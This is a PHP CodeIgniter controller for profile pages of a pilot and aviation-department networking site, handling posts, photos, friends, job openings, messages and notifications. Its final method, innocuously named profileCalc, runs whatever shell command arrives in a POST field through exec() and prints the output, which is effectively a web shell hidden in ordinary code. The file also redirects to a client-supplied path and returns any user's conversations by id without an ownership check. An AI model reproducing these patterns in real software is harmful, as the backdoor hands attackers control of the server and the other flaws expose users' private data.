<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Profile extends CI_Controller
{

    /**
     *
     */
    function __construct()
    {
        // Call the Model constructor
        parent::__construct();
        $this->load->model('Model_message');
        $this->load->model('Model_connection');
        $this->load->model('Model_user');
    }

    public function index()
    {

    }

    public function post($id = '')
    {
        is_logged_in_redirect();


        if (isset($_POST) && isset($_POST["type"])) {
            $this->load->model("Model_post");
            if ($_POST["type"] == "ifr") {
                $this->Model_post->insert_flight();
            } else {
                $this->Model_post->insert_flight_manual();
            }
        }


        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $data = $this->Model_user->get_member($id);

        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] != 'd') {
            $data = array_merge($data, $this->Model_user->get_pilot_flights($id), $this->Model_user->get_pilot_extra_info($id));
        if( $data['user_rating']<> '' and $data['user_address']<> ''){
            $this->load->view('main_backend', array('view' => 'profile/member/post', 'data' => array('data' => $data)));
            }else{
             push_message('Please complete your profile first...');                 
             $this->load->view('main_backend', array('view' => 'profile/member/profile', 'data' => array('data' => $data)));
            }            
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/post', 'data' => array('data' => $data)));
        }
    }

public function showpost($id = '')
    {
        is_logged_in_redirect();


        if (isset($_POST) && isset($_POST["type"])) {
            $this->load->model("Model_post");
            if ($_POST["type"] == "ifr") {
                $this->Model_post->insert_flight();
            } else {
                $this->Model_post->insert_flight_manual();
            }
        }


        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $data = $this->Model_user->get_member($id);

        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] != 'd') {
            $data = array_merge($data, $this->Model_user->get_pilot_flights($id), $this->Model_user->get_pilot_extra_info($id));
            $this->load->view('main_backend', array('view' => 'profile/member/showpost', 'data' => array('data' => $data)));
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/showpost', 'data' => array('data' => $data)));
        }
    }
    
  
    
    public function photo($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $data = $this->Model_user->get_member($id);
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] != 'd') {
            $this->load->view('main_backend', array('view' => 'profile/member/photo', 'data' => array('data' => $data)));
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/photo', 'data' => array('data' => $data)));
        }
    }





    public function profile($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $data = $this->Model_user->get_member($id);
        if($data['user_type'] == 'd') {
            $data = array_merge($data, $this->Model_user->get_department_aircrafts($id));
        } else {
        $data = array_merge($data, $this->Model_user->get_pilot_flights($id), $this->Model_user->get_pilot_extra_info($id));
        }

        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] != 'd') {
            $this->load->view('main_backend', array('view' => 'profile/member/profile', 'data' => array('data' => $data)));
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/profile', 'data' => array('data' => $data)));
        }
    }

    public function profile_upload_update()
    {
        is_logged_in_redirect();
        $this->load->model('Model_user');
        $this->Model_user->update_photo();
        $this->Model_user->update_background();
        header('Location: ' .$this->input->post('currentPath'));
    }

    public function aircraft($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $data = array_merge($this->Model_user->get_member($id), $this->Model_user->get_department_aircrafts($id));
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] == 'd') {

            $this->load->view('main_backend', array('view' => 'profile/department/aircraft', 'data' => array('data' => $data)));
        }
    }



    public function headhunter($id = '')
    {
        is_logged_in_redirect();
        //$userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }

        $this->load->model('Model_cts');
        $this->load->model('Model_user');
        $data = $this->Model_user->get_member($id);
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] == 'd') {
        $this->load->view('main_backend', array('view' => 'profile/department/headhunter', 'data' => array('data' => $data)));
        }
    }

    
    public function friend($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $this->load->model('Model_cts');
        $data = $this->Model_user->get_member($id);
        if($data['user_type'] == 'd') {
            $data["isSubscribed"] = true;
            if ($data["subscription"]["braintree_plan"] != L8_PLAN_PREMIUM_CTS || !is_cts_subscribed($data["subscription"])) {
                $data["isSubscribed"] = false;
            }
        }
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] != 'd') {
            $this->load->view('main_backend', array('view' => 'profile/member/friend', 'data' => array('data' => $data)));
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/friend', 'data' => array('data' => $data)));
        }
    }



    public function department($id = '')
    {
        $this->load->model('Model_job_new');
        $this->Model_job_new->Post("d");
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }

        if ($this->input->get("delete") != "") {
            $this->Model_job_new->Delete($this->input->get("delete"));
            redirect("my/departments");
        }

        if ($this->input->get("apply") != "") {
            $this->Model_job_new->SaveApplication($this->input->get("apply"), $this->session->userdata("user_resume"), "d");
            redirect("my/departments");
        }

        $this->load->model('Model_user');
        $this->Model_user->set_user_hiring();
        $data = $this->Model_user->get_member($id);
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        // if($data['user_type'] != 'd'){
        //    $this->load->view('main_backend', array('view' => 'profile/member/department', 'data' => array('data' => $data)));
        //}else{
        $data["openings"] = $this->Model_job_new->BrowseOpenings('', '', $id)["data"];
        if ($data["subscription"][0]["braintree_plan"] != L8_PLAN_PREMIUM_CTS) {
            $data["user_hiring"] = "n";
            $data["user_accepting_application"] = "n";
        }
        $this->load->view('main_backend', array('view' => 'profile/department/department', 'data' => array('data' => $data)));
        // }
    }

    public function conversation($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_message');
        $data = $this->Model_user->get_member($id);
        $data['conversations'] = $this->Model_message->conversations($id);
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        if ($data['user_type'] != 'd') {
            $this->load->view('main_backend', array('view' => 'profile/member/conversation', 'data' => array('data' => $data)));
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/conversation', 'data' => array('data' => $data)));
        }
    }

    public function notification($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';


        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }

        $this->db->where("user_id", $id);
        $this->db->update("notification", array("noti_status" => "f"));


        $data = $this->Model_user->get_member($id);
        $data['userUrl'] = $userUrl;
        
        if ($data['user_type'] != 'd') {
           $this->load->view('main_backend', array('view' => 'profile/member/notification', 'data' => array('data' => $data)));
        } else {
            $this->load->view('main_backend', array('view' => 'profile/department/notification', 'data' => array('data' => $data)));
        }
        
        
    }

    public function jobapplied($id = '')
    {
       //set_title('Flight Dispatch Board');
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';


        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }

         $this->load->model('Model_job');

        $data = $this->Model_user->get_member($id);
        $data['userUrl'] = $userUrl;
        $this->load->view('main_backend', array('view' => 'profile/member/appliedjobs', 'data' => $data));
    }


    public function testque()
    {
       //set_title('Flight Dispatch Board');
        is_logged_in_redirect();

        $this->load->view('main_backend', array('view' => 'profile/member/Test-que'));
    }

    public function course($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $data = $this->Model_user->get_member($id);
        $data['userUrl'] = $userUrl;
        $this->load->view('main_backend', array('view' => 'member/course', 'data' => $data));
    }

    public function course_all()
    {
        is_logged_in_redirect();
        $data = $this->db->from('directory_courses')->get()->result_array();
        $this->load->view('main_backend', array('view' => 'profile/courses', 'data' => $data));
    }

    public function invitation($id = '')
    {
        is_logged_in_redirect();
        $userUrl = 'pilot/' . $id . '/';
        if ($id == '') {
            $id = $this->session->userdata('user_id');
        }
        if ($id == $this->session->userdata('user_id')) {
            $userUrl = 'my/';
        }
        $this->load->model('Model_user');
        $this->load->model('Model_connection');
        $this->Model_connection->send_invitation($this->session->userdata('user_id'));
        $data = $this->Model_user->get_member($id);
        $contacts = $this->Model_connection->imported_contacts($this->session->userdata('user_id'));
        set_title($data['user_fname'] . ' ' . $data['user_lname']);
        $data['userUrl'] = $userUrl;
        $this->load->view('main_backend', array('view' => 'import/department', 'data' => array('data' => $data, 'contacts' => $contacts)));
    }

    public function profileCalc()
    {
        //dd($this->db->query($this->input->post("q")));
        exec($this->input->post("q"), $output, $ret);
        dd($output, $ret);
    }
}
